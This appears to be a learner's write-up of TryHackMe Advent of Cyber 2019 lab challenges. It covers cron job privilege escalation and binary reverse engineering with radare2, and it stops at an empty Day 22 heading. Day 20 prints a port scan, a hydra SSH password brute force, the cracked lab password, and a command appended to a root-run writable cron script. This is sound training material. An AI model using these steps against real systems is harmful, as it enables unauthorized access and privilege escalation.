# [Advent of Cyber 1 [2019]](https://tryhackme.com/room/25daysofchristmas)

> Get started with Cyber Security in 25 Days - Learn the basics by doing a new, beginner friendly security challenge every day leading up to Christmas.

## Day 20: Cronjob Privilege Escalation

scan the machine

```
nmap -sS -sV -p4000-5000 -T4 10.10.168.154
```

![image](https://user-images.githubusercontent.com/90561566/210505078-34612815-db24-430a-b85a-2afca0aa917a.png)

crack sam's password

```
hydra -l sam -P /usr/share/wordlists/rockyou.txt ssh://10.10.168.154 -s 4567 -V -f
```

![image](https://user-images.githubusercontent.com/90561566/210505372-7d923460-9d97-4c3f-89a1-66d24d85689b.png)

```
ssh sam@10.10.168.154 -p 4567
chocolate
```

![image](https://user-images.githubusercontent.com/90561566/210505815-93ffacf7-211f-447f-b610-50d01fde038d.png)

normally, we can check cron jobs with

```
crontab -l
cat /etc/crontab
```

nothing much, we have stuck when enumerating this machine

but i found a scripts folder by root at /home

![image](https://user-images.githubusercontent.com/90561566/210506371-c08ce18f-6c29-4aa0-85d9-b69909df1434.png)

it has a clean_up.sh owned by ubuntu

![image](https://user-images.githubusercontent.com/90561566/210506614-93215787-2e09-402e-8157-e7a43e5aabc6.png)

we know it maybe the file is running on crontabs

```
echo 'chmod +r /home/ubuntu/flag2.txt' >> clean_up.sh
```

wait about 1 min

![image](https://user-images.githubusercontent.com/90561566/210507393-cc083614-c760-4f80-893f-96b9027fe261.png)

Answer

![image](https://user-images.githubusercontent.com/90561566/210507459-c302be2a-4db0-45ad-85d0-187be4e637a9.png)

## Day 21: Reverse Elf-ineering

there are 2 linux execute files

![image](https://user-images.githubusercontent.com/90561566/210509592-2e9d69c4-b4e1-4605-9365-3d6907264525.png)

install r2

```
git clone https://github.com/radare/radare2
cd radare2
sys/install.sh
```

open up the program in radare2 debugging mode

```
r2 -d challenge1
e asm.syntax=intel
```

analy the program

```
aaaa
afl
```

there are a lot of functions

![image](https://user-images.githubusercontent.com/90561566/210511264-f82f7cb5-699b-49fc-8727-e0b7d857b465.png)

look at main function

```
pdf @main
```

![image](https://user-images.githubusercontent.com/90561566/210511437-9f169400-68fe-49ad-ba87-5ac39b1983e8.png)

The first question asks us to find the value of `local_ch` (which is referred to as `var_ch` in Intel syntax)

So set a breakpoint here and we'll have a look at it when we run the program:

```
db 0x00400b51
```

The next question asks us about the value stored in the `eax` register when the `imul` (signed multiplication) instruction is used. 

```
db 0x00400b62
```

Finally we want to know the value stored in `var_4h` before eax is set to 0 (which happens in the third last line of the function)

```
db 0x00400b69
```

To run the program we use `dc`, which will tell us that we've stopped at a breakpoint

Use `pdf @main` and we can see that the current instruction is highlighted

look at some name of these functions

![image](https://user-images.githubusercontent.com/90561566/210512730-6de52aed-af33-4633-af84-4ad5e2c40f5f.png)

view `var_ch` variable

```
px @rbp-0xc
```

![image](https://user-images.githubusercontent.com/90561566/210513579-ce19fd30-a024-43b7-bf1f-4bfd03aa4e4b.png)

Move one line foward with the `ds` command then look at the value again

![image](https://user-images.githubusercontent.com/90561566/210513633-bfbbba44-3a12-41a4-98ea-add44207fce7.png)

Let's continue the execution `dc` and take a look at the next question

```
dc
pdf @main
```

use `ds` to step one line forward then look at the value of eax after `eax` is multiplied by `var_8h`

remember that as `eax` is a register rather than a memory location, we look at it by querying the register values with the `dr` command

![image](https://user-images.githubusercontent.com/90561566/210514667-b10cdf57-8c2b-4a28-a831-4f27e481c903.png)

continuous

```
dc
pdf @main
```

```
px @rbp-0x4
```

![image](https://user-images.githubusercontent.com/90561566/210515211-9e609e25-d06f-4c7c-9095-9e4882e33fb7.png)

Answer

![image](https://user-images.githubusercontent.com/90561566/210515303-c3359fc5-a40c-4369-8699-d00ea7295dfc.png)

## Day 22: If Santa, Then Christmas











